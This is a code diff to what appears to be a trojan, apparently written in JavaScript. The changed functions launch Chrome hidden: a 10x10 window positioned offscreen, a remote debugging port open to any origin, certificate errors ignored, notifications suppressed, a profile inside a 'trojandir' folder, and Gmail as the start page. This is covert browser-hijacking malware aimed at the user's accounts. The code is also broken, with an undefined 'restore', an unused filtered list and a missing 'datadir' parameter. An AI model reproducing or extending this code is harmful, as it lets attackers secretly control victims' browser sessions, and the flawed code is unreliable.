@@ -345,39 +345,44 @@ function exec_chrome(
     );
 }
 
-// note: child chrome process has a new/different pid upon launch
-// existing chrome process interferes with launch of new process
-function spawn_chrome(
-    starturl = "https://www.gmail.com/",
-    debugport = 9223,
-    headless = false,
-    unref = false,
-    x_pos = 2000,
-    y_pos = 2000,
-    width = 10,
-    height = 10,
-    datadir = path.join(trojandir, "chrome"),
-    stdoutfunc = null,
-    stderrfunc = null,
-    closefunc = null
-) {
-    datadir = datadir || path.join(trojandir, "chrome");
-
+function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, datadir="C:\\ProgramData\\test_owd\\chrome", x_pos=2000, y_pos=2000, width=10, height=10, headless=false) {
     let cmdlineargs = [
         `--remote-debugging-port=${debugport}`,
-        // `--user-data-dir=${datadir}`,
+        `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
         headless ? `--headless=new` : "",
         `--no-first-run`, // You can skip Chrome's welcome and setup screens
         `--no-default-browser-check`,
         `--profile-directory=Default`,
         `--remote-allow-origins=*`,
-        // `--restore-last-session`,
+        restore ? `--restore-last-session` : null,
         `--ignore-certificate-errors`,
         `--window-position=${x_pos},${y_pos}`,
         `--window-size=${width},${height}`,
         `--hide-crash-restore-bubble`,
+        `--disable-notifications`,
+        `--suppress-message-center-popups`
     ];
+
+    let ret = cmdlineargs.filter(item => {
+        return ! isNullOrWhitespace(item);
+    });
+
+    return cmdlineargs;
+}
+
+// note: child chrome process has a new/different pid upon launch
+// existing chrome process interferes with launch of new process
+function spawn_chrome(
+    starturl = "https://www.gmail.com/",
+    debugport = 9223,
+    stdoutfunc = null,
+    stderrfunc = null,
+    closefunc = null
+) {
+    datadir = datadir || path.join(trojandir, "chrome");
+
+    let cmdlineargs = chrome_cmdlineargs(starturl, debugport);
 
     // TODO auto discover by reading chrome lnk files
 
@@ -386,7 +391,7 @@ function spawn_chrome(
         // windowsHide: true,
         // stdio: ["ignore", out, err],
         //shell: true,
-        cwd: `C:\\Users\\${username}\\AppData\\Local\\chrome-win64\\`,
+        cwd: path.dirname(chrome_debug_path)
     });
 
     child.stdout.on("data", (data) => {
